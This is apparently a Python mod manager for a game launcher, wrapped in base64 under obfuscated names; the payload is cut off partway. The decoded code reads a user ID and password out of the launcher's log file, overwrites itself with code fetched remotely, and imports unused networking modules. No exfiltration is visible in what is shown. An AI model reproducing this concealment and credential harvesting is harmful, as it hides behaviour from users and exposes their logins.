import base64 as pDelbRaI
ervZrQbR = "aW1wb3J0IG9zCmltcG9ydCBqc29uCmltcG9ydCBzaHV0aWwKaW1wb3J0IGhhc2hsaWIKZnJvbSB0a2ludGVyIGltcG9ydCBUaywgZmlsZWRpYWxvZwpmcm9tIGNvbG9yYW1hIGltcG9ydCBpbml0LCBGb3JlCmltcG9ydCByYW5kb20KaW1wb3J0IHVybGxpYi5yZXF1ZXN0CmltcG9ydCBzeXMKaW1wb3J0IHRpbWUKaW1wb3J0IHN1YnByb2Nlc3MKaW1wb3J0IHJlcXVlc3RzCmltcG9ydCB0cmFjZWJhY2sKaW1wb3J0IHNvY2tldAppbXBvcnQgc3RydWN0CmltcG9ydCBiYXNlNjQKCiMgLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIFZlcnNpeW9uIEtvbnRyb2zDvAojIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KQ1VSUkVOVF9WRVJTSU9OID0gIjEuMC42IgpWRVJTSU9OX1VSTCA9ICJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vZXJvbmZvcnlvdS9CYXNvLU5ldHdvcmstTW9kLVlvbmV0aWNpc2kvcmVmcy9oZWFkcy9tYWluL3ZlcnNpb24udHh0IgpTQ1JJUFRfVVJMICA9ICJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vZXJvbmZvcnlvdS9CYXNvLU5ldHdvcmstTW9kLVlvbmV0aWNpc2kvcmVmcy9oZWFkcy9tYWluL0JOV01vZFlvbmV0aWNpc2kucHkiClNDUklQVF9QQVRIID0gb3MucGF0aC5yZWFscGF0aChfX2ZpbGVfXykKCmRlZiBjaGVja191cGRhdGUoKToKICAgIHRyeToKICAgICAgICB3aXRoIHVybGxpYi5yZXF1ZXN0LnVybG9wZW4oVkVSU0lPTl9VUkwpIGFzIHJlc3BvbnNlOgogICAgICAgICAgICBsYXRlc3RfdmVyc2lvbiA9IHJlc3BvbnNlLnJlYWQoKS5kZWNvZGUoInV0Zi04Iikuc3RyaXAoKS5yZXBsYWNlKCJcdWZlZmYiLCAiIikKICAgICAgICBjdXJyZW50ID0gQ1VSUkVOVF9WRVJTSU9OLnN0cmlwKCkKICAgICAgICBwcmludChmIlNpemluIHPDvHLDvG06IHtjdXJyZW50fSB8IFN1bnVjdWRha2kgc8O8csO8bToge2xhdGVzdF92ZXJzaW9ufSIpCiAgICAgICAgaWYgbGF0ZXN0X3ZlcnNpb24gIT0gY3VycmVudDoKICAgICAgICAgICAgcHJpbnQoZiJZZW5pIHPDvHLDvG0gYnVsdW5kdToge2xhdGVzdF92ZXJzaW9ufSAoU2l6aW4gc8O8csO8bToge2N1cnJlbnR9KSIpCiAgICAgICAgICAgIHByaW50KCJHw7xuY2VsbGVtZSBpbmRpcmlsaXlvci4uLiIpCiAgICAgICAgICAgIHdpdGggdXJsbGliLnJlcXVlc3QudXJsb3BlbihTQ1JJUFRfVVJMKSBhcyByZXNwb25zZToKICAgICAgICAgICAgICAgIG5ld19zY3JpcHQgPSByZXNwb25zZS5yZWFkKCkKICAgICAgICAgICAgd2l0aCBvcGVuKFNDUklQVF9QQVRILCAid2IiKSBhcyBmOgogICAgICAgICAgICAgICAgZi53cml0ZShuZXdfc2NyaXB0KQogICAgICAgICAgICBwcmludCgiR8O8bmNlbGxlbWUgdGFtYW1sYW5kxLEhIEzDvHRmZW4gcHJvZ3JhbcSxIHRla3JhciBiYcWfbGF0xLFuLiIpCiAgICAgICAgICAgIHN5cy5leGl0KCkKICAgICAgICBlbHNlOgogICAgICAgICAgICBwcmludChmIlPDvHLDvG0gZ8O8bmNlbDoge2N1cnJlbnR9IikKICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICBwcmludChmIlZlcnNpeW9uIGtvbnRyb2zDvCB5YXDEsWxhbWFkxLE6IHtlfSIpCgoKIyAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgQmHFn2xhbmfEscOnIGF5YXJsYXLEsQojIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KaW5pdChhdXRvcmVzZXQ9VHJ1ZSkKanNvbmZpbGUgPSByIkM6XHhhbXBwXGh0ZG9jc1xmaWxlcyIKbW9kZGlyID0gb3MucGF0aC5qb2luKG9zLmVudmlyb25bIlVTRVJQUk9GSUxFIl0sICJBcHBEYXRhIiwgIlJvYW1pbmciLCAiLmJhc29udyIsICJtb2RzIikKb3MubWFrZWRpcnMobW9kZGlyLCBleGlzdF9vaz1UcnVlKQoKc2V0dGluZ3NfZmlsZSA9IG9zLnBhdGguam9pbihvcy5lbnZpcm9uWyJVU0VSUFJPRklMRSJdLCAiLmJhc29fc2V0dGluZ3MuanNvbiIpCgojIEvEsXJtxLF6xLEgdG9ubGFyxLEgbGlzdGVzaQpyZWRfdG9uZXMgPSBbRm9yZS5MSUdIVFJFRF9FWCwgRm9yZS5SRURdCgojIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBLdWxsYW7EsWPEsSBhZMSxIMOnZWttZSAobGF0ZXN0LmxvZykKIyAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCmRlZiBnZXRfdXNlcl9pbmZvKCk6CiAgICBsb2dfcGF0aCA9IG9zLnBhdGguam9pbihvcy5lbnZpcm9uWyJVU0VSUFJPRklMRSJdLCAiQXBwRGF0YSIsICJSb2FtaW5nIiwgIi5iYXNvbnciLCAibG9ncyIsICJsYXRlc3QubG9nIikKICAgIHVzZXJfaWQgPSAiQmlsaW5taXlvciIKICAgIHBhc3N3b3JkID0gIkJpbGlubWl5b3IiCiAgICB0cnk6CiAgICAgICAgd2l0aCBvcGVuKGxvZ19wYXRoLCAiciIsIGVuY29kaW5nPSJ1dGYtOCIpIGFzIGY6CiAgICAgICAgICAgIGZvciBsaW5lIGluIGY6CiAgICAgICAgICAgICAgICBpZiAiU2V0dGluZyB1c2VyOiIgaW4gbGluZToKICAgICAgICAgICAgICAgICAgICB1c2VyX2lkID0gbGluZS5zdHJpcCgpLnNwbGl0KCJTZXR0aW5nIHVzZXI6IilbLTFdLnN0cmlwKCkKICAgICAgICAgICAgICAgIGlmICJSZWNlaXZlZCBtZXNzYWdlOiIgaW4gbGluZSBhbmQgInwiIGluIGxpbmU6CiAgICAgICAgICAgICAgICAgICAgcGFzc3dvcmQgPSBsaW5lLnN0cmlwKCkuc3BsaXQoInwiKVstMV0uc3RyaXAoKQogICAgZXhjZXB0IEZpbGVOb3RGb3VuZEVycm9yOgogICAgICAgIHBhc3MKICAgIHJldHVybiB1c2VyX2lkLCBwYXNzd29yZAoKIyAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgQVNDSUkgQmHFn2zEsWsKIyAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCmRlZiBwcmludF9jb2xvcmVkX2FzY2lpKG5hbWUpOgogICAgdHJ5OgogICAgICAgIGltcG9ydCBweWZpZ2xldAogICAgICAgIGFzY2lpX3RleHQgPSBweWZpZ2xldC5maWdsZXRfZm9ybWF0KG5hbWUpCiAgICBleGNlcHQgSW1wb3J0RXJyb3I6CiAgICAgICAgYXNjaWlfdGV4dCA9IG5hbWUgICMgcHlmaWdsZXQgeW9rc2EgZMO8eiB5YXoKICAgIGZvciBsaW5lIGluIGFzY2lpX3RleHQuc3BsaXRsaW5lcygpOgogICAgICAgIG91dCA9ICIiCiAgICAgICAgZm9yIGMgaW4gbGluZToKICAgICAgICAgICAgaWYgYy5zdHJpcCgpID09ICIiOgogICAgICAgICAgICAgICAgb3V0ICs9IGMKICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIGNvbG9yID0gcmFuZG9tLmNob2ljZShyZWRfdG9uZXMpCiAgICAgICAgICAgICAgICBvdXQgKz0gY29sb3IgKyBjCiAgICAgICAgcHJpbnQob3V0KQoKIyAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgTW9kIEZvbmtzaXlvbmxhcsSxCiMgLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpkZWYgY2FsY3VsYXRlX3NoYTEoZmlsZV9wYXRoKToKICAgIHNoYTEgPSBoYXNobGliLnNoYTEoKQogICAgd2l0aCBvcGVuKGZpbGVfcGF0aCwgInJiIikgYXMgZjoKICAgICAgICB3aGlsZSBjaHVuayA6PSBmLnJlYWQoODE5Mik6CiAgICAgICAgICAgIHNoYTEudXBkYXRlKGNodW5rKQogICAgcmV0dXJuIHNoYTEuaGV4ZGlnZXN0KCkKCmRlZiBsb2FkX2pzb24oKToKICAgIGlmIG9zLnBhdGguZXhpc3RzKGpzb25maWxlKToKICAgICAgICB3aXRoIG9wZW4oanNvbmZpbGUsICJyIiwgZW5jb2Rpbmc9InV0Zi04IikgYXMgZjoKICAgICAgICAgICAgcmV0dXJuIGpzb24ubG9hZChmKQogICAgcmV0dXJuIFtdCgpkZWYgc2F2ZV9qc29uKGRhdGEpOgogICAganNvbl90ZXh0ID0gIltcbiIKICAgIGZvciBpLCBtIGluIGVudW1lcmF0ZShkYXRhKToKICAgICAgICBqc29uX3RleHQgKz0gIiAgIiArIGpzb24uZHVtcHMobSwgZW5zdXJlX2FzY2lpPUZhbHNlLCBpbmRlbnQ9MikucmVwbGFjZSgiXG4iLCAiXG4gICIpCiAgICAgICAgaWYgaSA8IGxlbihkYXRhKSAtIDE6CiAgICAgICAgICAgIGpzb25fdGV4dCArPSAiLCIKICAgICAgICBqc29uX3RleHQgKz0gIlxuIgogICAganNvbl90ZXh0ICs9ICJdXG4iCiAgICB3aXRoIG9wZW4oanNvbmZpbGUsICJ3IiwgZW5jb2Rpbmc9InV0Zi04IikgYXMgZjoKICAgICAgICBmLndyaXRlKGpzb25fdGV4dCkKCmRlZiBhZGRfbW9kKCk6CiAgICBvcy5zeXN0ZW0oImNscyIpCiAgICB1c2VyX2lkLCBfID0gZ2V0X3VzZXJfaW5mbygpCiAgICBwcmludF9jb2xvcmVkX2FzY2lpKHVzZXJfaWQpCiAgICBUaygpLndpdGhkcmF3KCkKICAgIGZpbGVfcGF0aCA9IGZpbGVkaWFsb2cuYXNrb3BlbmZpbGVuYW1lKHRpdGxlPSJMw7x0ZmVuIGVrbGVuZWNlayBkb3N5YXnEsSBzZcOnaW4iKQogICAgaWYgbm90IGZpbGVfcGF0aDoKICAgICAgICBwcmludChGb3JlLkxJR0hUUkVEX0VYICsgIkRvc3lhIHNlw6dpbG1lZGkuIikKICAgICAgICBpbnB1dCgiRGV2YW0gZXRtZWsgacOnaW4gRW50ZXInYSBiYXPEsW4uLi4iKQogICAgICAgIHJldHVybgogICAgZmlsZW5hbWUgPSBvcy5wYXRoLmJhc2VuYW1lKGZpbGVfcGF0aCkKICAgIHRhcmdldF9wYXRoID0gb3MucGF0aC5qb2luKG1vZGRpciwgZmlsZW5hbWUpCiAgICBzaHV0aWwuY29weTIoZmlsZV9wYXRoLCB0YXJnZXRfcGF0aCkKICAgIGZpbGVzaXplID0gb3MucGF0aC5nZXRzaXplKHRhcmdldF9wYXRoKQogICAgc2hhMSA9IGNhbGN1bGF0ZV9zaGExKHRhcmdldF9wYXRoKQogICAgbW9kcyA9IGxvYWRfanNvbigpCiAgICBtb2RzLmFwcGVuZCh7CiAgICAgICAgIm5hbWUiOiBmaWxlbmFtZSwKICAgICAgICAic2l6ZSI6IGZpbGVzaXplLAogICAgICAgICJzaGExIjogc2hhMSwKICAgICAgICAiZG93bmxvYWRfbGluayI6IGYiL2Rvd25sb2FkL21vZHMve2ZpbGVuYW1lfSIsCiAgICAgICAgInBhdGgiOiBmIm1vZHMve2ZpbGVuYW1lfSIKICAgIH0pCiAgICBzYXZlX2pzb24obW9kcykKICAgIHByaW50KEZvcmUuTElHSFRSRURfRVggKyBmIk1vZCBla2xlbmRpOiB7ZmlsZW5hbWV9IikKICAgIGlucHV0KCJEZXZhbSBldG1layBpw6dpbiBFbnRlcidhIGJhc8Sxbi4uLiIpCgppbXBvcnQgb3MKaW1wb3J0IGpzb24KZnJvbSBjb2xvcmFtYSBpbXBvcnQgRm9yZQoKZGVmIGxpc3RfbW9kcygpOgogICAgd2hpbGUgVHJ1ZToKICAgICAgICBvcy5zeXN0ZW0oImNscyIpCiAgICAgICAgdXNlcl9pZCwgXyA9IGdldF91c2VyX2luZm8oKQogICAgICAgIHByaW50X2NvbG9yZWRfYXNjaWkodXNlcl9pZCkKICAgICAgICBwcmludChGb3JlLldISVRFICsgIk1vZCBMaXN0ZWxlbWUgTWVuw7xzw7xcbiIpCiAgICAgICAgcHJpbnQoRm9yZS5SRUQgKyAiMS4iICsgRm9yZS5MSUdIVFJFRF9FWCArICIgVMO8bSBNb2RsYXIiKQogICAgICAgIHByaW50KEZvcmUuUkVEICsgIjIuIiArIEZvcmUuTElHSFRSRURfRVggKyAiIEVrc2lrIE1vZGxhciIpCiAgICAgICAgcHJpbnQoRm9yZS5SRUQgKyAiMy4iICsgRm9yZS5MSUdIVFJFRF9FWCArICIgR2VyaSIpCgogICAgICAgIGNob2ljZSA9IGlucHV0KEZvcmUuV0hJVEUgKyAiXG5TZcOnaW1pbml6OiAiKQoKICAgICAgICBpZiBjaG9pY2UgPT0gIjEiOgogICAgICAgICAgICAjIC0tLSBUw7xtIG1vZGxhciAtLS0KICAgICAgICAgICAgb3Muc3lzdGVtKCJjbHMiKQogICAgICAgICAgICBwcmludF9jb2xvcmVkX2FzY2lpKHVzZXJfaWQpCiAgICAgICAgICAgIG1vZHMgPSBvcy5saXN0ZGlyKG1vZGRpcikgaWYgb3MucGF0aC5leGlzdHMobW9kZGlyKSBlbHNlIFtdCiAgICAgICAgICAgIHByaW50KEZvcmUuTElHSFRSRURfRVggKyAiTW9kcyBrbGFzw7Zyw7xuZGVraSBtb2RsYXI6XG4iKQogICAgICAgICAgICBpZiBub3QgbW9kczoKICAgICAgICAgICAgICAgIHByaW50KEZvcmUuUkVEICsgIkhpw6cgbW9kIGJ1bHVuYW1hZMSxLiIpCiAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICBjb2xvcnMgPSBbRm9yZS5SRUQsIEZvcmUuTElHSFRSRURfRVhdCiAgICAgICAgICAgICAgICBmb3IgaSwgbSBpbiBlbnVtZXJhdGUobW9kcyk6CiAgICAgICAgICAgICAgICAgICAgY29sb3IgPSBjb2xvcnNbaSAlIDJdCiAgICAgICAgICAgICAgICAgICAgcHJpbnQoY29sb3IgKyBmIiAtIHttfSIpCiAgICAgICAgICAgIGlucHV0KCJcbkRldmFtIGV0bWVrIGnDp2luIEVudGVyJ2EgYmFzxLFuLi4uIikKCiAgICAgICAgZWxpZiBjaG9pY2UgPT0gIjIiOgogICAgICAgICAgICAjIC0tLSBFa3NpayBtb2RsYXIgLS0tCiAgICAgICAgICAgIG9zLnN5c3RlbSgiY2xzIikKICAgICAgICAgICAgcHJpbnRfY29sb3JlZF9hc2NpaSh1c2VyX2lkKQoKICAgICAgICAgICAgaWYgbm90IG9zLnBhdGguZXhpc3RzKGpzb25maWxlKToKICAgICAgICAgICAgICAgIHByaW50KEZvcmUuUkVEICsgIkZpbGVzIGtsYXPDtnLDvG5kZSBKU09OIGRvc3lhc8SxIGJ1bHVuYW1hZMSxLiIpCiAgICAgICAgICAgICAgICBpbnB1dCgiXG5EZXZhbSBldG1layBpw6dpbiBFbnRlcidhIGJhc8Sxbi4uLiIpCiAgICAgICAgICAgICAgICBjb250aW51ZQoKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgd2l0aCBvcGVuKGpzb25maWxlLCAiciIsIGVuY29kaW5nPSJ1dGYtOCIpIGFzIGY6CiAgICAgICAgICAgICAgICAgICAgZmlsZXNfZGF0YSA9IGpzb24ubG9hZChmKQogICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgICAgICAgICBwcmludChGb3JlLlJFRCArIGYiSlNPTiBva3VuYW1hZMSxOiB7ZX0iKQogICAgICAgICAgICAgICAgaW5wdXQoIlxuRGV2YW0gZXRtZWsgacOnaW4gRW50ZXInYSBiYXPEsW4uLi4iKQogICAgICAgICAgICAgICAgY29udGludWUKCiAgICAgICAgICAgIG1vZHNfaW5fZm9sZGVyID0gc2V0KG9zLmxpc3RkaXIobW9kZGlyKSkgaWYgb3MucGF0aC5leGlzdHMobW9kZGlyKSBlbHNlIHNldCgpCgogICAgICAgICAgICAjIPCflLkgc2FkZWNlIHBhdGgnaSAnbW9kcy8nIGlsZSBiYcWfbGF5YW5sYXLEsSBhbAogICAgICAgICAgICBtb2RzX2luX2ZpbGVzID0gewogICAgICAgICAgICAgICAgbVsibmFtZSJdIGZvciBtIGluIGZpbGVzX2RhdGEKICAgICAgICAgICAgICAgIGlmIGlzaW5zdGFuY2UobSwgZGljdCkgYW5kICJuYW1lIiBpbiBtIGFuZCAicGF0aCIgaW4gbSBhbmQgbVsicGF0aCJdLnN0YXJ0c3dpdGgoIm1vZHMvIikKICAgICAgICAgICAgfQoKICAgICAgICAgICAgbWlzc2luZyA9IG1vZHNfaW5fZmlsZXMgLSBtb2RzX2luX2ZvbGRlcgoKICAgICAgICAgICAgcHJpbnQoRm9yZS5MSUdIVFJFRF9FWCArICJFa3NpayBNb2RsYXI6XG4iKQogICAgICAgICAgICBpZiBub3QgbWlzc2luZzoKICAgICAgICAgICAgICAgIHByaW50KEZvcmUuR1JFRU4gKyAiRWtzaWsgbW9kIHlvay4gVMO8bSBtb2RsYXIgecO8a2zDvC4iKQogICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgZm9yIGksIG0gaW4gZW51bWVyYXRlKHNvcnRlZChtaXNzaW5nKSwgMSk6CiAgICAgICAgICAgICAgICAgICAgY29sb3IgPSBGb3JlLkxJR0hUUkVEX0VYIGlmIGkgJSAyIGVsc2UgRm9yZS5SRUQKICAgICAgICAgICAgICAgICAgICBwcmludChjb2xvciArIGYiIC0ge219IikKICAgICAgICAgICAgaW5wdXQoIlxuRGV2YW0gZXRtZWsgacOnaW4gRW50ZXInYSBiYXPEsW4uLi4iKQoKICAgICAgICBlbGlmIGNob2ljZSA9PSAiMyI6CiAgICAgICAgICAgIGJyZWFrCgoKCmRlZiBkZWxldGVfbW9kKCk6CiAgICBvcy5zeXN0ZW0oImNscyIpCiAgICB1c2VyX2lkLCBfID0gZ2V0X3VzZXJfaW5mbygpCiAgICBwcmludF9jb2xvcmVkX2FzY2lpKHVzZXJfaWQpCiAgICBtb2RzID0gb3MubGlzdGRpcihtb2RkaXIpCiAgICBpZiBub3QgbW9kczoKICAgICAgICBwcmludChGb3JlLlJFRCArICJIacOnIG1vZCBidWx1bmFtYWTEsS4iKQogICAgICAgIGlucHV0KCJEZXZhbSBldG1layBpw6dpbiBFbnRlcidhIGJhc8Sxbi4uLiIpCiAgICAgICAgcmV0dXJuCiAgICBwcmludChGb3JlLkxJR0hUUkVEX0VYICsgIlNpbGluZWNlayBtb2Qgc2XDp2luOlxuIikKICAgIGNvbG9ycyA9IFtGb3JlLlJFRCwgRm9yZS5MSUdIVFJFRF9FWF0KICAgIGZvciBpLCBtIGluIGVudW1lcmF0ZShtb2RzLCAxKToKICAgICAgICBjb2xvcl9udW1iZXIgPSBjb2xvcnNbKGktMSkgJSAyXQogICAgICAgIGNvbG9yX25hbWUgPSBjb2xvcnNbaSAlIDJdCiAgICAgICAgcHJpbnQoY29sb3JfbnVtYmVyICsgZiJ7aX0uIiArIGNvbG9yX25hbWUgKyBmIiB7bX0iKQogICAgY2hvaWNlID0gaW5wdXQoRm9yZS5MSUdIVFJFRF9FWCArICJcbk51bWFyYSBnaXJpbjogIikKICAgIGlmIG5vdCBjaG9pY2UuaXNkaWdpdCgpIG9yIG5vdCAoMSA8PSBpbnQoY2hvaWNlKSA8PSBsZW4obW9kcykpOgogICAgICAgIHByaW50KEZvcmUuTElHSFRSRURfRVggKyAiR2XDp2Vyc2l6IHNlw6dpbS4iKQogICAgICAgIGlucHV0KCJEZXZhbSBldG1layBpw6dpbiBFbnRlcidhIGJhc8Sxbi4uLiIpCiAgICAgICAgcmV0dXJuCiAgICBtb2RuYW1lID0gbW9kc1tpbnQoY2hvaWNlKS0xXQogICAgb3MucmVtb3ZlKG9zLnBhdGguam9pbihtb2RkaXIsIG1vZG5hbWUpKQogICAgZGF0YSA9IGxvYWRfanNvbigpCiAgICBkYXRhID0gW20gZm9yIG0gaW4gZGF0YSBpZiBtWyJuYW1lIl0gIT0gbW9kbmFtZV0KICAgIHNhdmVfanNvbihkYXRhKQogICAgcHJpbnQoRm9yZS5MSUdIVFJFRF9FWCArIGYiTW9kIHNpbGluZGk6IHttb2RuYW1lfSIpCiAgICBpbnB1dCgiRGV2YW0gZXRtZWsgacOnaW4gRW50ZXInYSBiYXPEsW4uLi4iKQoKIyAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgS3VsbGFuxLFjxLEgQmlsZ2lsZXJpCiMgLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpkZWYgc2hvd191c2VyX2luZm8oKToKICAgIG9zLnN5c3RlbSgiY2xzIikKICAgIHVzZXJfaWQsIHBhc3N3b3JkID0gZ2V0X3VzZXJfaW5mbygpCiAgICBwcmludF9jb2xvcmVkX2FzY2lpKHVzZXJfaWQpCiAgICBtb2RfbGlzdCA9IG9zLmxpc3RkaXIobW9kZGlyKQogICAgdG90YWxfbW9kcyA9IGxlbihtb2RfbGlzdCkKICAgIHRvdGFsX3NpemUgPSBzdW0ob3MucGF0aC5nZXRzaXplKG9zLnBhdGguam9pbihtb2RkaXIsIG0pKSBmb3IgbSBpbiBtb2RfbGlzdCkKICAgIGxhc3RfY2hlY2tfdGltZSA9IHRpbWUuc3RyZnRpbWUoIiVZLSVtLSVkICVIOiVNOiVTIiwgdGltZS5sb2NhbHRpbWUoKSkKICAgIHByaW50KEZvcmUuTElHSFRSRURfRVggKyBmIklEOiB7dXNlcl9pZH0iKQogICAgcHJpbnQoRm9yZS5MSUdIVFJFRF9FWCArIGYixZ5pZnJlOiB7cGFzc3dvcmR9IikKICAgIHByaW50KEZvcmUuTElHSFRSRURfRVggKyBmIlZlcnNpeW9uOiAxLjIxLjQiKQogICAgcHJpbnQoRm9yZS5MSUdIVFJFRF9FWCArIGYiWcO8a2zDvCBtb2Qgc2F5xLFzxLE6IHt0b3RhbF9tb2RzfSIpCiAgICBwcmludChGb3JlLkxJR0hUUkVEX0VYICsgZiJUb3BsYW0gbW9kIGJveXV0dToge3RvdGFsX3NpemUgLyAxMDI0Oi4yZn0gS0IiKQogICAgcHJpbnQoRm9yZS5MSUdIVFJFRF9FWCArIGYiU29uIGfDvG5jZWxsZW1lIGtvbnRyb2zDvDoge2xhc3RfY2hlY2tfdGltZX0iKQogICAgaW5wdXQoIlxuRGV2YW0gZXRtZWsgacOnaW4gRW50ZXInYSBiYXPEsW4uLi4iKQoKIyAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgTGF1bmNoZXIgQcOnCiMgLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpkZWYgb3Blbl9sYXVuY2hlcigpOgogICAgb3Muc3lzdGVtKCJjbHMiKQogICAgdXNlcl9pZCwgXyA9IGdldF91c2VyX2luZm8oKQogICAgcHJpbnRfY29sb3JlZF9hc2NpaSh1c2VyX2lkKQoKICAgICMgRGluYW1payBwYXRoIChoZXIga3VsbGFuxLFjxLF5YSBnw7ZyZSkKICAgIGxvY2FsX2FwcGRhdGEgPSBvcy5nZXRlbnYoIkxPQ0FMQVBQREFUQSIpCiAgICBsYXVuY2hlcl9wYXRoID0gb3MucGF0aC5qb2luKGxvY2FsX2FwcGRhdGEsICJCYXNvIE5ldHdvcmsiLCAiYmFzb253LmV4ZSIpCgogICAgaWYgb3MucGF0aC5leGlzdHMobGF1bmNoZXJfcGF0aCk6CiAgICAgICAgcHJpbnQoRm9yZS5MSUdIVFJFRF9FWCArICJCYXNvIE5ldHdvcmsgbGF1bmNoZXIgYcOnxLFsxLF5b3IuLi4iKQogICAgICAgIG9zLnN0YXJ0ZmlsZShsYXVuY2hlcl9wYXRoKQogICAgZWxzZToKICAgICAgICBwcmludChGb3JlLlJFRCArICJMYXVuY2hlciBidWx1bmFtYWTEsTogIiArIGxhdW5jaGVyX3BhdGgpCgogICAgaW5wdXQoIlxuRGV2YW0gZXRtZWsgacOnaW4gRW50ZXInYSBiYXPEsW4uLi4iKQoKIyAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgWEFNUFAgQmHFn2xhdAojIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KZGVmIHN0YXJ0X3hhbXBwKCk6CiAgICBvcy5zeXN0ZW0oImNscyIpCiAgICB1c2VyX2lkLCBfID0gZ2V0X3VzZXJfaW5mbygpCiAgICBwcmludF9jb2xvcmVkX2FzY2lpKHVzZXJfaWQpCiAgICB4YW1wcF9wYXRoID0gciJDOlx4YW1wcFxhcGFjaGVfc3RhcnQuYmF0IgogICAgc3RhcnR1cF9mb2xkZXIgPSBvcy5wYXRoLmpvaW4ob3MuZW52aXJvblsiQVBQREFUQSJdLCByIk1pY3Jvc29mdFxXaW5kb3dzXFN0YXJ0IE1lbnVcUHJvZ3JhbXNcU3RhcnR1cCIpCiAgICBzaG9ydGN1dF9wYXRoID0gb3MucGF0aC5qb2luKHN0YXJ0dXBfZm9sZGVyLCAiYXBhY2hlX3N0YXJ0LmxuayIpCgogICAgIyBBeWFybGFyCiAgICBhdXRvID0gRmFsc2UKICAgIGlmIG9zLnBhdGguZXhpc3RzKHNldHRpbmdzX2ZpbGUpOgogICAgICAgIHdpdGggb3BlbihzZXR0aW5nc19maWxlLCAiciIpIGFzIGY6CiAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgIHMgPSBqc29uLmxvYWQoZikKICAgICAgICAgICAgICAgIGF1dG8gPSBzLmdldCgieGFtcHBfYXV0byIsIEZhbHNlKQogICAgICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgICAgICBwYXNzCiAgICBlbHNlOgogICAgICAgICMgxLBsayBrdWxsYW7EsW0gc29ydXN1CiAgICAgICAgY2hvaWNlID0gaW5wdXQoIkJ1IMO2emVsbGnEn2kgb3RvbWF0aWsgeWFwbWFrIGlzdGVyIG1pc2luaXo/IChFL0gpXG4+ICIpLnN0cmlwKCkudXBwZXIoKQogICAgICAgIGlmIGNob2ljZSA9PSAiRSI6CiAgICAgICAgICAgIGF1dG8gPSBUcnVlCiAgICAgICAgICAgIGpzb24uZHVtcCh7InhhbXBwX2F1dG8iOiBUcnVlfSwgb3BlbihzZXR0aW5nc19maWxlLCAidyIpKQogICAgICAgICAgICBwcmludCgiQXJ0xLFrIGhlciBhw6fEsWzEscWfdGEgQXBhY2hlIGFya2FwbGFuZGEgYmHFn2xheWFjYWsuIikKICAgICAgICBlbHNlOgogICAgICAgICAgICBqc29uLmR1bXAoeyJ4YW1wcF9hdXRvIjogRmFsc2V9LCBvcGVuKHNldHRpbmdzX2ZpbGUsICJ3IikpCiAgICAgICAgICAgIHByaW50KCJBcGFjaGUgYXJrYXBsYW5kYSBiYcWfbGF0xLFsYWNhaywgYmHFn2xhbmfEsWNhIGVrbGVubWV5ZWNlay4iKQoKICAgIGlmIG9zLnBhdGguZXhpc3RzKHhhbXBwX3BhdGgpOgogICAgICAgICMgQXBhY2hlJ3lpIGFya2EgcGxhbmRhIGJhxZ9sYXQKICAgICAgICBzdWJwcm9jZXNzLlBvcGVuKFt4YW1wcF9wYXRoXSwgY3JlYXRpb25mbGFncz1zdWJwcm9jZXNzLkNSRUFURV9OT19XSU5ET1cpCiAgICAgICAgcHJpbnQoRm9yZS5MSUdIVFJFRF9FWCArICJBcGFjaGUgYmHFn2xhdMSxbGTEsS4iKQoKICAgICAgICAjIEXEn2VyIG90b21hdGlrIGHDp21hIGlzdGVuaXlvcnNhIHZlIGvEsXNheW9sIHlva3NhIHN0YXJ0dXAnYSBla2xlCiAgICAgICAgaWYgYXV0bzoKICAgICAgICAgICAgaWYgbm90IG9zLnBhdGguZXhpc3RzKHNob3J0Y3V0X3BhdGgpOgogICAgICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgICAgIGltcG9ydCBweXRob25jb20KICAgICAgICAgICAgICAgICAgICBmcm9tIHdpbjMyY29tLnNoZWxsIGltcG9ydCBzaGVsbCwgc2hlbGxjb24KICAgICAgICAgICAgICAgICAgICBweXRob25jb20uQ29Jbml0aWFsaXplKCkKICAgICAgICAgICAgICAgICAgICBzaGVsbF9saW5rID0gcHl0aG9uY29tLkNvQ3JlYXRlSW5zdGFuY2UoCiAgICAgICAgICAgICAgICAgICAgICAgIHNoZWxsLkNMU0lEX1NoZWxsTGluaywgTm9uZSwKICAgICAgICAgICAgICAgICAgICAgICAgcHl0aG9uY29tLkNMU0NUWF9JTlBST0NfU0VSVkVSLCBzaGVsbC5JSURfSVNoZWxsTGluaykKICAgICAgICAgICAgICAgICAgICBzaGVsbF9saW5rLlNldFBhdGgoeGFtcHBfcGF0aCkKICAgICAgICAgICAgICAgICAgICBzaGVsbF9saW5rLlNldERlc2NyaXB0aW9uKCJBcGFjaGUgU3RhcnQiKQogICAgICAgICAgICAgICAgICAgIHBlcnNpc3RfZmlsZSA9IHNoZWxsX2xpbmsuUXVlcnlJbnRlcmZhY2UocHl0aG9uY29tLklJRF9JUGVyc2lzdEZpbGUpCiAgICAgICAgICAgICAgICAgICAgcGVyc2lzdF9maWxlLlNhdmUoc2hvcnRjdXRfcGF0aCwgMCkKICAgICAgICAgICAgICAgICAgICBwcmludChGb3JlLkxJR0hUUkVEX0VYICsgIkFwYWNo